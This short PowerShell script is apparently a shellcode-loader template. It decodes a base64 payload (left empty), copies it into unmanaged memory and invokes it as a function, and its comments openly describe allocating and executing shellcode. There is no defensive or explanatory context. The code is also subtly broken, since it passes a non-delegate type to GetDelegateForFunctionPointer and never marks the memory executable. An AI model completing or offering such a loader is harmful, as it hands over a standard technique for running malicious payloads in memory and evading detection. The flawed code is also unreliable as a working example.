$shellcode = ""
$bytes = [System.Convert]::FromBase64String($shellcode)

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)

# Create a delegate to the shellcode
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [type]::GetType("System.IntPtr"))

# Execute the shellcode
$func.Invoke()